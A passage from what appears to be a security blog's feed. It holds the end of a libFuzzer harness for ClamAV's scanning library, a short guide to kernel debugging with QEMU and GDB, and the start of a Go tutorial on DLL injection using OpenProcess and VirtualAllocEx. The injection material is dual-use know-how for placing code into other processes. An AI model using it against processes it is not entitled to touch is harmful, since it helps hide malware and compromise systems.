</span></span></code></pre></div><p>The important points here are the the choice of the compiler, which has to be of course clang and setting the CFLAGS in order to add to the code the fuzzing instrumentation and ASAN. The fuzzer-no-link specifies that we add the fuzzing instrumentation to the components being compiled, but we will provide the entry point in another application, which will be the fuzzer itself.</p>
<p>In order to fuzz a function of our choice the entry point of the fuzzer application needs to be declared as the following one:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">LLVMFuzzerTestOneInput</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">uint8_t</span> <span style="color:#f92672">*</span>Data, <span style="color:#66d9ef">size_t</span> Size) {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">DoSomethingInterestingWithMyAPI</span>(Data, Size);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;  <span style="color:#75715e">// Non-zero return values are reserved for future use.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
</span></span></code></pre></div><p>Data and Size are the current mutated input derived from the corpus (or in case of a missing corpus it will be generated by libFuzzer itself) and its size in bytes.</p>
<p>So the question now is: how do we provide such data to libclamav? We choose a target function of the library, which in this case is:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">cl_scanfile</span>(
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>filename,
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>virname,
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>scanned,
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> cl_engine <span style="color:#f92672">*</span>engine,
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> cl_scan_options <span style="color:#f92672">*</span>options);
</span></span></code></pre></div><p>This function receives a filename to be scanned, a pointer to virname where the virus name will be stored in case the supplied file has been identified as a malicious one, the scanned data size til now (actually optional parameter, it can be NULL), the engine which is the AV engine struct and options which is a struct containing a series of options that control the behavior of the engine.</p>
<p>Lets first write a function which initializes the engine and returns a pointer to it:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>byteCodePath <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/var/lib/clamav/bytecode.cvd&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> cl_engine <span style="color:#f92672">*</span><span style="color:#a6e22e">init_clam</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> signo;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">cl_error_t</span> status <span style="color:#f92672">=</span> <span style="color:#a6e22e">cl_init</span>(CL_INIT_DEFAULT);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (status <span style="color:#f92672">!=</span> CL_SUCCESS) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;cl_init error: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">cl_strerror</span>(status));
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> NULL;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> cl_engine <span style="color:#f92672">*</span>engine <span style="color:#f92672">=</span> <span style="color:#a6e22e">cl_engine_new</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (engine <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;cl_engine_new error</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> NULL;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    status <span style="color:#f92672">=</span> <span style="color:#a6e22e">cl_load</span>(byteCodePath, engine, <span style="color:#f92672">&amp;</span>signo, CL_DB_BYTECODE);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (status <span style="color:#f92672">!=</span> CL_SUCCESS) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;cl_load error: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">cl_strerror</span>(status));
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> cleanup_engine_with_error;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    status <span style="color:#f92672">=</span> <span style="color:#a6e22e">cl_engine_compile</span>(engine);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (status <span style="color:#f92672">!=</span> CL_SUCCESS) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;cl_engine_compile: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">cl_strerror</span>(status));
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> cleanup_engine_with_error;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> engine;
</span></span><span style="display:flex;"><span>cleanup_engine_with_error:
</span></span><span style="display:flex;"><span>    status <span style="color:#f92672">=</span> <span style="color:#a6e22e">cl_engine_free</span>(engine);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (status <span style="color:#f92672">!=</span> CL_SUCCESS) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;cl_engine_free: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">cl_strerror</span>(status));
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> NULL;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>We call cl_init() to initialize the library, the we cl_engine_new() in order to get a new engine then cl_load() to load bytecode based signatures. Notice here that I’ve used specifically this kind of signature since it is small and quick to be loaded. We do so in order to speed up the fuzzer initialization process, if you use huge signatures database it will take time for the fuzzer to load and execute each time (for example if you’re going to fuzz clamscan binary with AFL++ or hongfuzz you will likely experience timeouts). We then finalize the process calling cl_engine_compile(). In case of errors we just return NULL and free the engine.</p>
<p>Our target function cl_scanfile() accepts a filename, while libFuzzer provides us with pointer to a series of bytes. So in order to provide this input to cl_scanfile() we need to first drop the content into a file and then invoke it passing the filename. So we write an utility function, which accepts a pointer to the data and its size and writes the content into a file which name suffix is “randomized”.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">create_fuzz_file</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">uint8_t</span> <span style="color:#f92672">*</span>data, <span style="color:#66d9ef">size_t</span> size) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> path[] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/tmp/fuzz-XXXXXX&#34;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">mkstemp</span>(path);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (fd <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> NULL;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> status <span style="color:#f92672">=</span> <span style="color:#a6e22e">write</span>(fd, data, size);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (status <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">close</span>(fd);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">unlink</span>(path);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> NULL;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">close</span>(fd);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>f <span style="color:#f92672">=</span> <span style="color:#a6e22e">strndup</span>(path, <span style="color:#a6e22e">strlen</span>(path));
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (f <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">unlink</span>(path);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> NULL;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> f;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The function is very simple, it creates a temporary file name with the /tmp/fuzz-XXXXXX template passed to mkstemp, writes the data in and returns a copy of its name allocated on the heap, so we’ve to remember to free it at some point.</p>
<p>Now last piece of the, the fuzzer entry point function:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">LLVMFuzzerTestOneInput</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">uint8_t</span> <span style="color:#f92672">*</span>data, <span style="color:#66d9ef">size_t</span> size) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> cl_engine <span style="color:#f92672">*</span>engine <span style="color:#f92672">=</span> <span style="color:#a6e22e">init_clam</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (engine <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;error while initializing clam</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>     
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>fname <span style="color:#f92672">=</span> <span style="color:#a6e22e">create_fuzz_file</span>(data, size);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (fname <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;failed to create fuzz file</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> cleanup_engine;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>virname;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> cl_scan_options options;
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>    options.parse <span style="color:#f92672">=</span> CL_SCAN_PARSE_ELF <span style="color:#f92672">|</span> CL_SCAN_PARSE_ARCHIVE <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span>        CL_SCAN_PARSE_HTML <span style="color:#f92672">|</span> CL_SCAN_PARSE_HWP3 <span style="color:#f92672">|</span> CL_SCAN_PARSE_MAIL <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span>        CL_SCAN_PARSE_OLE2 <span style="color:#f92672">|</span> CL_SCAN_PARSE_PDF <span style="color:#f92672">|</span> CL_SCAN_PARSE_PE <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span>        CL_SCAN_PARSE_SWF <span style="color:#f92672">|</span> CL_SCAN_PARSE_XMLDOCS <span style="color:#f92672">|</span> CL_SCAN_MAIL_PARTIAL_MESSAGE;
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>    options.general <span style="color:#f92672">=</span> CL_SCAN_GENERAL_ALLMATCHES <span style="color:#f92672">|</span> CL_SCAN_GENERAL_HEURISTICS;
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>    options.heuristic <span style="color:#f92672">=</span> CL_SCAN_HEURISTIC_BROKEN <span style="color:#f92672">|</span> CL_SCAN_HEURISTIC_MACROS <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span>        CL_SCAN_HEURISTIC_STRUCTURED;
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">cl_error_t</span> status <span style="color:#f92672">=</span> <span style="color:#a6e22e">cl_scanfile</span>(fname, <span style="color:#f92672">&amp;</span>virname, NULL, engine, <span style="color:#f92672">&amp;</span>options);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (status <span style="color:#f92672">==</span> CL_VIRUS) {
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">//fprintf(stdout, &#34;detected virus: %s\n&#34;, virname);
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (status <span style="color:#f92672">!=</span> CL_CLEAN) {
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">//fprintf(stderr, &#34;cl_scanfile error: %s\n&#34;, cl_strerror(status));
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">goto</span> cleanup_file;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>cleanup_file:
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">unlink</span>(fname);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">free</span>(fname);
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>cleanup_engine:
</span></span><span style="display:flex;"><span>    status <span style="color:#f92672">=</span> <span style="color:#a6e22e">cl_engine_free</span>(engine);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (status <span style="color:#f92672">!=</span> CL_SUCCESS) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;cl_engine_free: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">cl_strerror</span>(status));
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Here the steps performed by this function:</p>
<ul>
<li>Call our init_clam() function and get a pointer to a new engine instance</li>
<li>Call create_fuzz_file() and get a pointer to the filename</li>
<li>Create a struct cl_options and initialize it with various file formats the engine has to scan, then we specify CL_SCAN_GENERAL_ALLMATCHES, which tells the scan function to continue to scan the file after it finds a first match and CL_SCAN_GENERAL_HEURISTICS which enables heuristics alerts to be shown (you can disable it if you want). Then we enable some heuristics and that’s it</li>
<li>We finally invoke the cl_scanfile() and at the end of the function we just cleanup freeing the engine and removing the fuzzed file</li>
<li>Before we build the fuzzer we need another step, to just make our life a little bit easier. We copy the instrumented shared libraries that have been built before in our current fuzzer directory:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find clamav-0.104.2/build -name <span style="color:#e6db74">&#34;*.so.*&#34;</span> -exec cp <span style="color:#f92672">{}</span> . <span style="color:#ae81ff">\;</span>
</span></span></code></pre></div><p>Now we just build our fuzzer:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>clang -o fuzz_libclamav fuzz_libclamav.c libclamav.so.9.1.0 libclammspack.so.0.8.0 -fsanitize<span style="color:#f92672">=</span>fuzzer,address -I ./clamav-0.104.2/libclamav/ -I ./clamav-0.104.2/build/
</span></span></code></pre></div><p>Now we need to have some corpus in order to aid the fuzzer with its job, for example we can create a CORPUS directory and put inside an ELF binary like echo or whatever we like. Or can try with archives, PDF and any other file type supported by ClamAV.</p>
<p>OK! Finally we can run our fuzzer (we need to use LD_LIBRARY_PATH to instruct the dynamic linker at runtime that necessary libraries have to be searched into our current fuzzer directory):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>LD_LIBRARY_PATH<span style="color:#f92672">=(</span>pwd<span style="color:#f92672">)</span> ./fuzz_libclamav CORPUS/
</span></span><span style="display:flex;"><span>Fuzzing session starting up
</span></span></code></pre></div><p><img src="/libfuzzer.webp" alt="libfuzzer"></p>
<p>If we hit CTRL-C and interrupt the execution we can always restart it later just rerunning the command above.</p>
<p>Don’t forget to check the libFuzzer documentation in order to dig deep into its details since we just scratched the surface.</p>
]]></content>
        </item>
        
        <item>
            <title>Quick Linux Kernel debug with QEMU, GDB and U-ROOT</title>
            <link>https://example.org/posts/03-linux-kernel-debug/</link>
            <pubDate>Mon, 14 Feb 2022 17:07:01 +0200</pubDate>
            
            <guid>https://example.org/posts/03-linux-kernel-debug/</guid>
            <description>When I want to harness with the Kernel, e.g., to play with some module I wrote, or just maybe learning something new about its internals I usually relay on some quick tricks to bring up a small environment to play with.
The first thing is I do is reusing the host kernel of my favorite distro: Fedora (unless some upstream feature I want to play with is not there and in that case I grab directly the sources from kernel.</description>
            <content type="html"><![CDATA[<p>When I want to harness with the Kernel, e.g., to play with some module I wrote, or just maybe learning something new about its internals I usually relay on some quick tricks to bring up a small environment to play with.</p>
<p>The first thing is I do is reusing the host kernel of my favorite distro: Fedora (unless some upstream feature I want to play with is not there and in that case I grab directly the sources from kernel.org building a custom one).</p>
<p>Second in order to have a minimal userspace I use U-ROOT to quickly build an initramfs.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>GO111MODULE<span style="color:#f92672">=</span>off ~/go/bin/u-root -build<span style="color:#f92672">=</span>gbb -o initramfs
</span></span></code></pre></div><p>Third in order to get support for debugging symbols I get the kernel-debuginfo package matching the host kernel, so I have both vmlinux and modules completely unstripped.</p>
<p>In order to run in QEMU:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>qemu-system-x86_64 -kernel /boot/vmlinuz-5.16.8-200.fc35.x86_64 -enable-kvm -smp <span style="color:#ae81ff">2</span> -m 2048M -s -S -initrd initramfs -append <span style="color:#e6db74">&#34;nokaslr&#34;</span>
</span></span></code></pre></div><p>The above command will run QEMU with the specified kernel and provides it an initramfs. The <code>-s -S</code> switch will tell QEMU to freeze on startup and start waiting for a GDB connection on port 1234. Also do not forget to append <code>nokaslr</code> to the kernel cmdline otherwise GDB later will not be able to solve symbols addresses.</p>
<p>Then we can open another shell and connect to QEMU using GDB in order to start a debugging session:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gdb -q /usr/lib/debug/lib/modules/5.16.8-200.fc35.x86_64/vmlinux
</span></span><span style="display:flex;"><span>pwndbg&gt; set architecture i386:x86-64
</span></span><span style="display:flex;"><span>The target architecture is set to <span style="color:#e6db74">&#34;i386:x86-64&#34;</span>.
</span></span><span style="display:flex;"><span>pwndbg&gt; target remote :1234
</span></span><span style="display:flex;"><span>Remote debugging using :1234
</span></span><span style="display:flex;"><span>pwndbg&gt; hbreak start_kernel
</span></span><span style="display:flex;"><span>Hardware assisted breakpoint <span style="color:#ae81ff">1</span> at 0xffffffff836c1e57: file init/main.c, line 925.
</span></span><span style="display:flex;"><span>pwndbg&gt; c
</span></span><span style="display:flex;"><span>Continuing.
</span></span></code></pre></div><p><img src="/kernel_debugging.webp" alt="gdb"></p>
<p>In the preceeding commands we first open GDB and provide the unstripped vmlinux image that comes with kernel-debuginfo package, then we set the target architecture for the running kernel, and finally put an hardware breakpoint on start_kernel function. Then we issue continue command and as soon as the breakpoint will be accessed execution will break. That’s it.</p>
]]></content>
        </item>
        
        <item>
            <title>DLL Injection using Go</title>
            <link>https://example.org/posts/04-go-dll-inject/</link>
            <pubDate>Wed, 19 Jan 2022 17:11:33 +0200</pubDate>
            
            <guid>https://example.org/posts/04-go-dll-inject/</guid>
            <description>DLL injection is the act of loading a library into a running process. Purposes can be multiple ones, like hijacking or instrumenting code, extending or adding functionalities of a software without recompiling it or malicious intents like hiding malware components.
In the first part of the post we will deal with the injection itself, while in the second one we’ll build a DLL in Go emphasizing some of the limitations and try to overcome them.</description>
            <content type="html"><![CDATA[<p>DLL injection is the act of loading a library into a running process. Purposes can be multiple ones, like hijacking or instrumenting code, extending or adding functionalities of a software without recompiling it or malicious intents like hiding malware components.</p>
<p>In the first part of the post we will deal with the injection itself, while in the second one we’ll build a DLL in Go emphasizing some of the limitations and try to overcome them. The whole article targets x86-64 machines and in order to build the DLL the mingw toolchain is needed. My personal choice is to install it using cygwin, but other ways do exist, so if you don’t like it, just search for something you prefer.</p>
<h2 id="dll-injection">DLL Injection:</h2>
<p>In order to load a DLL into a running process what is needed are usually the following steps:</p>
<ul>
<li>Call OpenProcess to obtain a handle to the process</li>
<li>Call VirtualAllocEx to allocate virtual memory into the remote process</li>
<li>Call WriteProcessMemory with the address obtained by VirtualAllocEx in order to write the path of the DLL file into remote process memory</li>
<li>Resolve the LoadLibraryA function address locally to the injector process. Since this function belongs to kernel32.dll which is mapped in all processes at the same address, we don’t need to resolve where it resides into our victim/remote process</li>
<li>Call CreateRemoteThread in order to start a thread into the remote process, the entry point will be the LoadLibraryA address and its argument will be the address where we stored the DLL path</li>
</ul>
<p>From now on let’s see how to write code to accomplish the above steps, also notice that where possible and to make the article more readable I’m going to omit error handling.</p>
<p>Go provides a package to deal with some Windows Win32 APIs but not all the functions we need are implemented, but this is not a problem, because we can resolve their addresses calling GetProcAddress on the kernel32.dll module.</p>
<p>So, the first step is to obtain a handle to the process, its type is windows.Handle that is just a typecast of uintptr in Go</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#75715e">// process open permissions
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">flags</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">windows</span>.<span style="color:#a6e22e">PROCESS_VM_OPERATION</span> | <span style="color:#a6e22e">windows</span>.<span style="color:#a6e22e">PROCESS_VM_READ</span> |   <span style="color:#a6e22e">windows</span>.<span style="color:#a6e22e">PROCESS_VM_WRITE</span> | <span style="color:#a6e22e">windows</span>.<span style="color:#a6e22e">PROCESS_CREATE_THREAD</span> | <span style="color:#a6e22e">windows</span>.<span style="color:#a6e22e">PROCESS_QUERY_INFORMATION</span>
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span><span style="color:#75715e">// get a handle to the process
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">pHandle</span>, <span style="color:#a6e22e">_</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">windows</span>.<span style="color:#a6e22e">OpenProcess</span>(uint32(<span style="color:#a6e22e">flags</span>), <span style="color:#66d9ef">false</span>, <span style="color:#a6e22e">pid</span>)
</span></span></code></pre></div><p>In the previous snippet of code we ask the OS which kind of permissions we want in order to operate on the process we’re opening. Of course if our process is not privileged enough in regards to the process we’re going to open the operation will fail. Flags we need are permissions for reading/writing memory, querying its basic information and creating a thread into remote process. Then we specify as the second argument the process PID.</p>
<p>Once we’ve a process handle, next task will be to reserve a portion of memory into its VAD (virtual address space) which we’ll later use to write the DLL’s path. Since this function is not implemented into the Go x/sys/windows package, we’re going to call it indirectly:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#75715e">// obtain a windows.LazyDLL object
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">kernel32</span>             <span style="color:#f92672">:=</span> <span style="color:#a6e22e">windows</span>.<span style="color:#a6e22e">NewLazySystemDLL</span>(<span style="color:#e6db74">&#34;kernel32.dll&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e">// obtain a windows.LazyProc object
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">virtualAllocEx</span>       <span style="color:#f92672">:=</span> <span style="color:#a6e22e">kernel32</span>.<span style="color:#a6e22e">NewProc</span>(<span style="color:#e6db74">&#34;VirtualAllocEx&#34;</span>)
</span></span></code></pre></div><p>Now we can implement a wrapper around VirtualAllocEx</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#75715e">// VirtualAllocEx wrapper
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">VirtualAllocEx</span>(<span style="color:#a6e22e">pHandle</span> <span style="color:#a6e22e">windows</span>.<span style="color:#a6e22e">Handle</span>, <span style="color:#a6e22e">size</span>, <span style="color:#a6e22e">allocType</span>, <span style="color:#a6e22e">allocProt</span> <span style="color:#66d9ef">uintptr</span>) (<span style="color:#66d9ef">uintptr</span>, <span style="color:#66d9ef">error</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// allocate virtual memory into remote process
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">addr</span>, <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">virtualAllocEx</span>.<span style="color:#a6e22e">Call</span>(
</span></span><span style="display:flex;"><span>        uintptr(<span style="color:#a6e22e">pHandle</span>),   <span style="color:#75715e">// handle
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        uintptr(<span style="color:#ae81ff">0</span>),         <span style="color:#75715e">// addr where allocate (0 since we ask the OS to assign one)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        uintptr(<span style="color:#a6e22e">size</span>),      <span style="color:#75715e">// size of allocation
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        uintptr(<span style="color:#a6e22e">allocType</span>), <span style="color:#75715e">// type of allocation
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        uintptr(<span style="color:#a6e22e">allocProt</span>)) <span style="color:#75715e">// protection of the allocation
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">addr</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">err</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">addr</span>, <span style="color:#66d9ef">nil</span>
</span></span><span style="display:flex;"><span>}
